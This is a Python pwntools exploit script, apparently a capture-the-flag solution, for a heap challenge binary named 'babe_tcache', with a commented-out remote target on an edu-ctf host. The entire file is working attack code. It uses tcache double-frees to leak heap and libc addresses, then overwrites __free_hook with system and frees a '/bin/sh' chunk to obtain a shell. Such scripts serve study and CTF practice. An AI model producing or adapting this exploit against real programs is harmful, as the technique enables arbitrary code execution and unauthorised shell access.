from pwn import *

context.log_level='debug'
def add(index,size,note):
    p.sendlineafter("> ","1")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(size))
    p.sendafter(": ",note)

def delete(index):
    p.sendlineafter("> ","3")
    p.sendlineafter(": ",str(index))
#p=remote("edu-ctf.zoolab.org",7122)
p = process("./babe_tcache")
add(0,0x68,"kirin")
add(1,0x68,"kirin")
delete(0)
delete(1)
add(0,0x68,"a")
p.sendlineafter("> ","2")
p.sendlineafter(": ","0")
s=p.recv(6).ljust(8,"\x00")
heap_addr=u64(s)
print "heap_base:",hex(heap_addr)
add(0,0x68,"kirin")
for i in range(0x18):
     add(1,0x68,"kirin")
delete(0)
delete(0) #chunk 0
add(0,0x68,p64((heap_addr&0xffffffffffffffff00)+0x50+0x70)+p64(0)*2+p64(0x51)+p64(0)*7+p64(0x4e1))

gdb.attach(p)
add(0,0x68,"kirin")
add(0,0x68,p64(0)+p64(0x71))
delete(0)
add(0,0x68,"1")
p.sendlineafter("> ","2")
p.sendlineafter(": ","0")
s=p.recv(6).ljust(8,"\x00")
libc_addr=(u64(s)&0xffffffffffffff00)+0x7fcdb6ca6000-0x7fcdb7092000
print hex(libc_addr)
add(0,0x68,"/bin/sh\x00")
add(1,0x78,"kirin")
delete(1)
delete(1)
add(1,0x78,p64(libc_addr+0x3ed8e8))
#gdb.attach(p)
add(1,0x78,"kirin")
add(1,0x78,p64(libc_addr+0x4f440))
p.interactive()
